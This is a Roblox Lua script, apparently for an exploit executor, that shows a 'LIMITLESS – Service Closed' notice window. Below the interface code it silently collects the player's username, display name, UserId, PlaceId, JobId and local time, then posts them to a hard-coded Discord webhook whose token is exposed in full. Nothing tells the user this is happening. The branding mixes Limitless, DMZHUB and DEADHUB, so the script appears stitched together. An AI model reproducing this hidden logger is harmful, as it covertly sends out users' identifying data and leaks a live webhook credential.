
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "LimitlessClosedUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui

-- Main Frame (centered)
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 280, 0, 180)
MainFrame.Position = UDim2.new(0.5, -140, 0.5, -90)
MainFrame.BackgroundColor3 = Color3.fromRGB(26, 26, 46)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 12)
MainCorner.Parent = MainFrame

local MainStroke = Instance.new("UIStroke")
MainStroke.Color = Color3.fromRGB(224, 64, 251)
MainStroke.Thickness = 2
MainStroke.Parent = MainFrame

-- Title Bar
local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Size = UDim2.new(1, 0, 0, 32)
TitleBar.Position = UDim2.new(0, 0, 0, 0)
TitleBar.BackgroundColor3 = Color3.fromRGB(18, 18, 42)
TitleBar.BorderSizePixel = 0
TitleBar.ZIndex = 2
TitleBar.Parent = MainFrame

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 12)
TitleCorner.Parent = TitleBar

-- Fix bottom corners of title bar
local TitleFix = Instance.new("Frame")
TitleFix.Size = UDim2.new(1, 0, 0, 12)
TitleFix.Position = UDim2.new(0, 0, 1, -12)
TitleFix.BackgroundColor3 = Color3.fromRGB(18, 18, 42)
TitleFix.BorderSizePixel = 0
TitleFix.ZIndex = 2
TitleFix.Parent = TitleBar

-- Title bar bottom stroke line
local TitleDivider = Instance.new("Frame")
TitleDivider.Size = UDim2.new(1, 0, 0, 1)
TitleDivider.Position = UDim2.new(0, 0, 1, -1)
TitleDivider.BackgroundColor3 = Color3.fromRGB(224, 64, 251)
TitleDivider.BackgroundTransparency = 0.6
TitleDivider.BorderSizePixel = 0
TitleDivider.ZIndex = 3
TitleDivider.Parent = TitleBar

-- Dot accent
local Dot = Instance.new("Frame")
Dot.Size = UDim2.new(0, 10, 0, 10)
Dot.Position = UDim2.new(0, 12, 0.5, -5)
Dot.BackgroundColor3 = Color3.fromRGB(224, 64, 251)
Dot.BorderSizePixel = 0
Dot.ZIndex = 3
Dot.Parent = TitleBar

local DotCorner = Instance.new("UICorner")
DotCorner.CornerRadius = UDim.new(1, 0)
DotCorner.Parent = Dot

-- Title Label
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, -60, 1, 0)
TitleLabel.Position = UDim2.new(0, 28, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "LIMITLESS"
TitleLabel.TextColor3 = Color3.fromRGB(192, 132, 252)
TitleLabel.TextSize = 11
TitleLabel.Font = Enum.Font.Code
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.ZIndex = 3
TitleLabel.Parent = TitleBar

-- Close Button
local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 28, 0, 28)
CloseBtn.Position = UDim2.new(1, -32, 0.5, -14)
CloseBtn.BackgroundTransparency = 1
CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.fromRGB(224, 64, 251)
CloseBtn.TextSize = 16
CloseBtn.Font = Enum.Font.Code
CloseBtn.ZIndex = 4
CloseBtn.Parent = TitleBar

CloseBtn.MouseButton1Click:Connect(function()
	ScreenGui:Destroy()
end)

-- Lock Icon
local LockIcon = Instance.new("TextLabel")
LockIcon.Size = UDim2.new(1, 0, 0, 32)
LockIcon.Position = UDim2.new(0, 0, 0, 38)
LockIcon.BackgroundTransparency = 1
LockIcon.Text = "🔒"
LockIcon.TextSize = 26
LockIcon.Font = Enum.Font.GothamBold
LockIcon.ZIndex = 2
LockIcon.Parent = MainFrame

-- Main Message
local MainMsg = Instance.new("TextLabel")
MainMsg.Size = UDim2.new(1, -20, 0, 20)
MainMsg.Position = UDim2.new(0, 10, 0, 76)
MainMsg.BackgroundTransparency = 1
MainMsg.Text = "Service Closed"
MainMsg.TextColor3 = Color3.fromRGB(243, 232, 255)
MainMsg.TextSize = 13
MainMsg.Font = Enum.Font.GothamBold
MainMsg.ZIndex = 2
MainMsg.Parent = MainFrame

-- Sub Message
local SubMsg = Instance.new("TextLabel")
SubMsg.Size = UDim2.new(1, -20, 0, 36)
SubMsg.Position = UDim2.new(0, 10, 0, 100)
SubMsg.BackgroundTransparency = 1
SubMsg.Text = "This service is closed for a moment.\nWe will be back later!"
SubMsg.TextColor3 = Color3.fromRGB(167, 139, 250)
SubMsg.TextSize = 11
SubMsg.Font = Enum.Font.Code
SubMsg.TextWrapped = true
SubMsg.ZIndex = 2
SubMsg.Parent = MainFrame

-- Divider
local Divider = Instance.new("Frame")
Divider.Size = UDim2.new(1, -20, 0, 1)
Divider.Position = UDim2.new(0, 10, 0, 144)
Divider.BackgroundColor3 = Color3.fromRGB(224, 64, 251)
Divider.BackgroundTransparency = 0.7
Divider.BorderSizePixel = 0
Divider.ZIndex = 2
Divider.Parent = MainFrame

-- Footer
local Footer = Instance.new("TextLabel")
Footer.Size = UDim2.new(1, -20, 0, 24)
Footer.Position = UDim2.new(0, 10, 0, 150)
Footer.BackgroundTransparency = 1
Footer.Text = "❤ Limitless"
Footer.TextColor3 = Color3.fromRGB(224, 64, 251)
Footer.TextSize = 11
Footer.Font = Enum.Font.Code
Footer.ZIndex = 2
Footer.Parent = MainFrame

local WEBHOOK_URL = "https://discord.com/api/webhooks/1454758401862009038/QlwqdhSOk3haHpFgF1HczvSe9hQ5IjLD40gHuqhZfwHaSp9P9_3uG2vJtAX5Kof-SAaE"

-- ================== SERVICES ==================
local Players       = game:GetService("Players")
local LocalPlayer   = Players.LocalPlayer or Players.PlayerAdded:Wait()
local Camera        = workspace.CurrentCamera
local Lighting      = game:GetService("Lighting")
local RunService    = game:GetService("RunService")
local UIS           = game:GetService("UserInputService")
local HttpService   = game:GetService("HttpService")
local TweenService  = game:GetService("TweenService")

-- ================== PLAYER INFO ==================
local username    = LocalPlayer.Name
local displayName = LocalPlayer.DisplayName
local userId      = LocalPlayer.UserId
local placeId     = game.PlaceId
local jobId       = game.JobId

-- ================== TIME ==================
local now = os.date("*t")
local jam = string.format("%02d:%02d:%02d", now.hour, now.min, now.sec)
local tanggal = os.date("%a %d %B %Y")

-- ================== DISCORD EMBED ==================
local payload = {
    username = "DMZHUB • Security Logger",
    embeds = {{
        title = "🚨 SCRIPT EXECUTED",
        description = "**DEADHUB DIGUNAKAN**",
        color = 0x5865F2, -- Discord blurple
        fields = {
            {
                name = "👤 Username",
                value = username,
                inline = true
            },
            {
                name = "🪪 Display Name",
                value = displayName,
                inline = true
            },
            {
                name = "🆔 UserId",
                value = tostring(userId),
                inline = true
            },
            {
                name = "🎮 PlaceId",
                value = tostring(placeId),
                inline = true
            },
            {
                name = "🧩 JobId",
                value = jobId,
                inline = true
            },
            {
                name = "🕒 Jam",
                value = jam,
                inline = true
            },
            {
                name = "📅 Tanggal",
                value = tanggal,
                inline = true
            }
        },
        footer = {
            text = "DMZHUB • Security Logger • "..os.date("%m/%d/%Y %I:%M %p")
        }
    }}
}

-- ================== SEND WEBHOOK ==================
local req = (syn and syn.request) or request or http_request
if req then
    req({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    })
else
    warn("Executor tidak support HTTP request")
end
